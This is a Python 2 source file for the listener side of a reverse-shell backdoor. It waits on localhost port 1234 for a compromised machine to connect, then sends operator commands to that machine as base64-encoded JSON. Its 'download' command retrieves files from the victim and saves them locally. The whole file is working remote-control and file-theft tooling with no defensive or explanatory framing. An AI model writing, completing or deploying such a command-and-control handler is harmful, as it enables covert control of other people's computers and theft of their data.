import socket, json, base64


class Listener:
    def __init__(self, ip , port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, adress = listener.accept()
        print("[+] Got connection from "+str(adress))



    def reliable_send(self,data):
        jason_data = json.dumps(data)
        self.connection.send(base64.b64encode(jason_data))

    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(base64.b64decode(json_data))
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(content)
            return "[+] Download successful"

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            user_input=raw_input(">> ").split(' ')
            result = self.execute_remotely(user_input)
            if user_input[0] == "download":
                # result = self.write_file("test.txt",result)
                result = self.write_file(user_input[1],result)

            print(result)



my_listener = Listener("localhost",1234)
my_listener.run()

